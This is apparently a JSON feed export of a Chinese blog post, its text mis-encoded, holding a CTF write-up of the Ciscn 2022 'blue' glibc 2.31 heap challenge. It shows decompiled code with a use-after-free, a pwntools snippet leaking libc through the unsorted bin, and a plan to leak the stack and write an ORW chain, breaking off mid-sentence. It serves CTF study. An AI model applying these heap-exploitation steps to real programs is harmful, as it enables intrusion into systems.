{
    "version": "https://jsonfeed.org/version/1",
    "title": "null â€¢ All posts by \"pwnçš„å­¦ä¹ \" category",
    "description": "æ¬¢è¿æ¥åˆ°Huançš„ç¬”è®°ç©ºé—´~~~~~~ğŸŒ¸",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2024/06/21/Ciscn-2022-blue/",
            "url": "http://example.com/2024/06/21/Ciscn-2022-blue/",
            "title": "Ciscn_2022_blue",
            "date_published": "2024-06-21T08:46:04.000Z",
            "content_html": "<h1 id=\"ciscn_2022-blue\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_2022-blue\">#</a> Ciscn_2022 blue</h1>\n<blockquote>\n<p>å‰è¨€ï¼šä¸€é“ 2.31 çš„ glibc å †é¢˜ï¼ˆå›½èµ›å°†è‡³ï¼Œå¤ç°ä¸€ä¸‹å§</p>\n</blockquote>\n<h2 id=\"äº†è§£ç¨‹åº\"><a class=\"markdownIt-Anchor\" href=\"#äº†è§£ç¨‹åº\">#</a> äº†è§£ç¨‹åº</h2>\n<p>é¦–å…ˆéœ€è¦æ£€æŸ¥ç¨‹åºä¿æŠ¤</p>\n<h3 id=\"ä¿æŠ¤å…¨å¼€\"><a class=\"markdownIt-Anchor\" href=\"#ä¿æŠ¤å…¨å¼€\">#</a> ä¿æŠ¤å…¨å¼€</h3>\n<p><img data-src=\"D:/%E7%AC%94%E8%AE%B0/picture/Untitled/image-20240621141324623.png\" alt=\"image-20240621141324623\"></p>\n<p>Ida åˆ†æä¸€ä¸‹ç¨‹åº</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> __fastcall __noreturn <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>__int64 a1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>a2<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>a3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">sub_1730</span><span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">,</span> a2<span class=\"token punctuation\">,</span> a3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      <span class=\"token function\">sub_18D5</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// èœå•ï¼Œæ—  edit</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      v3 <span class=\"token operator\">=</span> <span class=\"token function\">sub_12A8</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//str_2_int</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">666</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token function\">sub_1663</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">></span> <span class=\"token number\">666</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>LABEL_13<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token function\">sub_1289</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      <span class=\"token function\">sub_14C5</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//show</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">></span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_13<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token function\">sub_138A</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//add</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>          <span class=\"token keyword\">goto</span> LABEL_13<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token function\">sub_1592</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//dele æ—  UAF</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"sub_1730å¼€å¯æ²™ç›’\"><a class=\"markdownIt-Anchor\" href=\"#sub_1730å¼€å¯æ²™ç›’\">#</a> sub_1730 (å¼€å¯æ²™ç›’)</h3>\n<p><img data-src=\"D:/%E7%AC%94%E8%AE%B0/picture/Untitled/image-20240621141506838.png\" alt=\"image-20240621141506838\"></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>__int64 <span class=\"token function\">sub_1663</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> dword_4070 <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span><span class=\"token comment\">// åªèƒ½ä½¿ç”¨ä¸€æ¬¡è¿™ä¸ªå‡½æ•°</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ERROR\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">_exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">sub_1289</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Please input idx: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token function\">sub_12A8</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v1 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x20</span> <span class=\"token operator\">&amp;&amp;</span> dword_4180<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> qword_4080<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>qword_4080<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// å­˜åœ¨ UAF</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token operator\">++</span>dword_4070<span class=\"token punctuation\">;</span><span class=\"token comment\">//delete_count</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">sub_1289</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DONE!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">sub_1289</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ERROR\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0xFFFFFFFFLL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> dword_406C <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span><span class=\"token comment\">// åŒæ ·åªèƒ½ show ä¸€æ¬¡</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ERROR\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token function\">_exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token function\">puts_0</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Please input idx: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token function\">str_2_int</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v1 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x20</span> <span class=\"token operator\">&amp;&amp;</span> dword_4180<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> qword_4080<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token function\">puts_0</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>qword_4080<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token operator\">++</span>dword_406C<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">puts_0</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Done!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token function\">puts_0</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ERROR\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> __fastcall __noreturn <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>a1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>a2<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>a3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">int_secc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      <span class=\"token function\">meau</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      v3 <span class=\"token operator\">=</span> <span class=\"token function\">str_2_int</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">666</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token function\">uaf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">></span> <span class=\"token number\">666</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>LABEL_13<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      a1 <span class=\"token operator\">=</span> <span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      <span class=\"token function\">puts_0</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">></span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_13<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>__int64<span class=\"token punctuation\">)</span>a1<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>__int64<span class=\"token punctuation\">)</span>a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>      <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>          <span class=\"token keyword\">goto</span> LABEL_13<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token function\">dele</span><span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">,</span> a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"D:/%E7%AC%94%E8%AE%B0/picture/Untitled/image-20240621142032888.png\" alt=\"image-20240621142032888\"></p>\n<p>å¯è§ç¨‹åºåª ban äº† execveï¼Œè¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ã€‚</p>\n<blockquote>\n<p>å­˜åœ¨æ²™ç›’ï¼Œä¸€èˆ¬æˆ‘æƒ³åˆ°çš„æ˜¯å»åˆ©ç”¨ env å»æ³„éœ²æ ˆåœ°å€ï¼Œç„¶åå†å»åŠ«æŒè¿”å›åœ°å€ã€‚</p>\n<p>åªéœ€è¦å°† orw å†™åˆ°è¿”å›åœ°å€ä¸Šå³å¯ã€‚</p>\n</blockquote>\n<h2 id=\"æ€è·¯è§„æ•´\"><a class=\"markdownIt-Anchor\" href=\"#æ€è·¯è§„æ•´\">#</a> æ€è·¯è§„æ•´</h2>\n<p>show åªæœ‰ä¸€æ¬¡ï¼Œé‚£å¦‚ä½•å³å»æ³„éœ² libc åœ°å€ï¼Œåˆå»æ³„éœ² stack åœ°å€å‘¢ï¼Ÿæ˜¾ç„¶æƒ³è¦ show ä¸¤æ¬¡æ˜¯ä¸åˆé€‚ã€‚ç¬¬ä¸€æ¬¡ show åªèƒ½æ˜¯æ³„éœ² libcï¼Œå› ä¸ºå»æ³„éœ² libc ä¹‹åæ‰èƒ½å¾—åˆ° envã€‚</p>\n<p>æ‰€ä»¥å¯ä»¥å°† tcache æ‰“æ»¡ï¼Œç„¶ååˆ©ç”¨ unsortedbin å»æ³„éœ² libc</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'Leaklibc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'gep'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>uaf<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>__malloc_hook <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">96</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>libcbase <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>success<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libcbase<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>è€Œç¬¬äºŒæ¬¡æˆ‘ä»¬éœ€è¦å»æ³„éœ² envï¼Œä½†æ˜¯ uaf å’Œ show éƒ½ç”¨è¿‡ä¸€æ¬¡äº†ï¼Œé‚£å¦‚ä½•å»åˆ©ç”¨å‘¢ã€‚</p>\n<p>é‚£ä¹ˆå°±éœ€è¦å»äº†è§£ä¸€ä¸‹ IO_FILE äº†ï¼Œstdoutã€‚<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjAyMjM3L2FydGljbGUvZGV0YWlscy8xMTM4NDUzMjA=\">å¥½å¥½è¯´è¯ä¹‹ IO_FILE åˆ©ç”¨ï¼ˆ1ï¼‰ï¼šåˆ©ç”¨_IO_2_1_stdout æ³„éœ² libc_libc æ³„éœ²æ–¹å¼ - CSDN åšå®¢</span></p>\n<p>è¿™ç¯‡æ–‡ç« 